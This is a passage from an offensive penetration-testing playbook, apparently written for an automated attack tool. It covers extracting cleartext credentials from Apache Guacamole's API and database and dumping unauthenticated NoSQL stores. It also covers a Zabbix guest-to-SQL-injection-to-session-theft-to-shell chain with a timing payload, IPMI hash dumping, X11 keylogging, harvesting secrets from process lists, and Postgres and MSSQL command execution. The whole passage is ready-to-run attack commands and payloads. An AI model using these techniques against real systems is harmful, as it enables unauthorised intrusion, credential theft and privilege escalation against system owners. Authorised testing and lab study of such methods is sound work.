so **every connection it holds embeds the credential to reach that target** — a
password or a private key (sometimes with its passphrase). Two ways in, and the
second beats the first:

- **Via the API, with a token.** After any Guacamole login (SSO or local), the
  connection secrets are readable by anyone with `ADMINISTER` on the connection:
  `GET /api/session/data/<ds>/connections/<id>/parameters?token=<tok>` returns
  `private-key`/`password`/`passphrase` in cleartext. `dataSource` is in the
  `/api/tokens` response (`mysql`, `postgresql`, `saml`, …).
- **Via the database — this is the real win.** Guacamole stores connections in a
  SQL backend (JDBC extension); the DB creds sit in the world-readable
  `/etc/guacamole/guacamole.properties` (`mysql-*`, or `postgresql-*`). The DB
  holds **cleartext connection parameters for connections your API user cannot
  see** — the permission model gates the API, not the table:
  ```sql
  select connection_id,connection_name,protocol from guacamole_connection;
  select connection_id,parameter_name,parameter_value from guacamole_connection_parameter;
  ```
  A connection to `localhost` as another local user (or root) is a lateral-move /
  privesc key handed over in plaintext. `guacamole.properties` also reveals the
  SSO wiring: `saml-username-attribute` (which SAML field becomes the guac
  username — not always the NameID) and `saml-idp-metadata-url`.

A recovered key that fails to load with `error in libcrypto: unsupported` is a
*tooling* problem, not a bad key: re-serialise it through Python `cryptography`
(`load_ssh_private_key`/`load_pem_private_key` → `private_bytes(...)`) to a PEM
the client accepts. Encrypted PEM keys (`Proc-Type: 4,ENCRYPTED`) use the stored
passphrase — the guac DB keeps the passphrase right next to the key.

## Elasticsearch / Kibana / MongoDB / Memcached / CouchDB

```bash
pwnloop x "curl -s http://$T:9200/_cat/indices"           # ES, often unauth → dump docs
pwnloop x "curl -s http://$T:5601/api/status"             # Kibana version → CVE
pwnloop x "mongosh --host $T --eval 'db.adminCommand({listDatabases:1})'"  # unauth Mongo
pwnloop x "memcstat --servers=$T; echo 'stats items' | nc -q1 $T 11211"    # Memcached
pwnloop x "curl -s http://$T:5984/_all_dbs"               # CouchDB; CVE-2017-12635 admin add
```
NoSQL stores are frequently left open with no auth — dump everything and grep for
credentials and tokens.

## Monitoring / infra — Zabbix, IPMI, VNC, X11

- **Zabbix** (`10051`/web) → agent `system.run` RCE, or web default creds
  `Admin:zabbix`.
  - **Pin the exact version first (`apiinfo.version` is unauthenticated), then
    check whether *guest* login is on** (`index.php?enter=guest`, or the login
    page's "sign in as guest" link). A guest session is a credential: it can
    browse Latest data / Problems and, more usefully, invoke **global scripts**
    straight at the trapper (`{"request":"command","sid":..,"scriptid":..,
    "hostid":..,"clientip":..}` to `10051`), which returns output in-band — no
    egress needed. Enumerate reachable hosts by sending `active checks` for
    candidate host names until one is not "host not found".
  - **A monitoring product's audit log is an attacker-fed SQL sink.** Zabbix,
    like most, records the *request metadata* of privileged actions (here the
    `clientip` of a script-execution request) into an audit `INSERT`. When that
    field is concatenated unescaped it is blind SQLi reachable by whoever can
    trigger the action — a guest, in the guest-login case. Confirm with a timing
    payload in the metadata field (`1' + (select sleep(5)) + '1`); the oracle is
    the response time of a call you already make, so it works with zero egress.
    Then extract a **live privileged `sessionid` from the session table** and
    present it as the API auth token (`Authorization: Bearer <sid>`) — session
    theft beats hash-cracking. (Version-pinned CVE example kept in `local.md`.)
  - Once you hold an admin API session, a global script with
    `execute_on = Zabbix server` runs shell on the server host and hands the
    output back in the API response.
- **IPMI** (`623/udp`) → `nmap --script ipmi-cipher-zero`;
  dump the RAKP hash and crack (`ipmitool`/`msf ipmi_dumphashes`).
- **VNC** (`5900`) → `nmap --script realvnc-auth-bypass`; captured `.vnc`
  passwords decrypt with `vncpwd`.
- **X11** (`6000`) → `xwd`/`xdotool` over an open display to screenshot/keylog.
- **A host-diagnostic page that lists processes is a credential source.** Any
  endpoint that renders `ps`-style output with full argument vectors —
  phpSysInfo with the `ps` plugin (`?plugin=ps&json`), a `/server-status` with
  `ExtendedStatus`, a Netdata/Glances/monit process panel — discloses every
  secret passed on a command line: `curl -u user:pass`, `mysql -pPASS`,
  `openvpn --auth-user-pass`, a token in a cron `wget`. Read the whole process
  table before assuming it is noise, and poll it across a minute to catch
  transient cron children (a job that leaks a password only exists on the wire
  while it runs). phpSysInfo itself is often behind weak Basic auth
  (`admin:admin`); the diagnostic value to *you* is the argv leak, not the CVE.

## PostgreSQL / MSSQL RCE (beyond the creds check in the DB section)

- **Postgres** superuser → `COPY … FROM PROGRAM 'id'` (9.3+), or the
  `dblink`/large-object routes. `nxc pgsql $T -u postgres -p pass -x id`.
- **MSSQL** `sa` → `xp_cmdshell` (enable via `sp_configure`), or `xp_dirtree`
  coercion (see the MSSQL section above).

## Anything unusual

Netcat the port and read the banner before assuming. Custom services on high
ports are frequently the intended path and are usually a buffer overflow or a
trivially injectable command handler. For crash-triage and exploitation of a
custom binary service, see `references/binary.md`.

```bash
pwnloop x "nc -nv $T <port>"
```
